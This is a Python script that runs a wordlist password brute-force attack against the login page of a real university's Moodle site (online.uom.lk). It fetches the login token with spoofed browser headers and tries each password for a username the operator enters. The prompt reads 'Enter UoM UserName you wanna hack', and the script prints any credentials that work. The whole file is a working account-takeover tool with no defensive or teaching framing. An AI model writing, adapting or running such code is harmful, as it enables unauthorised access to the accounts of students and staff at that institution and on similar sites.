import requests
from bs4 import BeautifulSoup


# Target URL for login
url = 'https://online.uom.lk/login/index.php'


# Headers for GET request to fetch initial login page
getHeaders = {
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Sec-Ch-Ua": 'Not/A)Brand";v="8", "Chromium";v="126"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Accept-Language": "en-US",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
    "Connection": "keep-alive",
}


# Headers for POST request to submit login credentials
postHeaders = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Accept-Language": "en-US",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://online.uom.lk",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://online.uom.lk/login/index.php",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
    "Connection": "keep-alive"
}


# Global variables for cookies and login token
cookie = {}
token = ""
validLogins = {}


# Function to perform GET request to fetch initial login page
def get_request():
    global cookie, token
    response = requests.get(url, headers=getHeaders, cookies=cookie)

    # Update cookies from response
    if 'Set-Cookie' in response.headers:
        moodleCookie = response.headers['Set-Cookie'].split(';')[0].split("=")
        cookie = {moodleCookie[0]: moodleCookie[1]}

    # Parse login token from response content
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        try:
            loginTokenValue = soup.find('input', {'name': 'logintoken'})['value']
            token = loginTokenValue
        except:
            raise ValueError("Token Not Found")
    else:
        raise ValueError(f"Failed to retrieve login page. Status code: {response.status_code}")


# Function to perform POST request with login credentials
def post_request(userName, password):
    global validLogins, token

    loginData = {
        'logintoken': token,
        'username': userName,
        'password': password
    }

    response = requests.post(url, headers=postHeaders, cookies=cookie, data=loginData)

    # Check if login was successful based on response headers
    if 'Set-Cookie' in response.headers:
        print("Login Found...")
        validLogins.update({userName:password})
    else:
        # If login failed, update token from response content
        soup = BeautifulSoup(response.content, 'html.parser')
        try:
            loginTokenValue = soup.find('input', {'name': 'logintoken'})['value']
            token = loginTokenValue
        except:
            raise ValueError("Token Not Found")


# Main function to initiate login process
def main():
    global cookie, userName

    # Input username and password file from user
    userName = input("Enter UoM UserName you wanna hack: ")
    if (not userName): raise ValueError("UoM UserName can't be empty")
    passwordFile = input("\nEnter the name of the WordList file: ") or "Passwords.txt"
    print()

    cookie = {}
    get_request()  # Fetch initial login page

    # Iterate through passwords in the provided file
    with open(passwordFile, 'r') as file:
        for idx, line in enumerate(file, start=1):
            password = line.strip()
            if (not validLogins):  # Check if valid login already found
                print("{0} Checking {1} : {2}".format(idx, userName, password))
                post_request(userName, password)
            else:break  # Break loop if valid login found
        if (validLogins):
            print("\n",validLogins,sep="")
        else:
            print("\nNo Logins Found")

if __name__ == "__main__":
    main()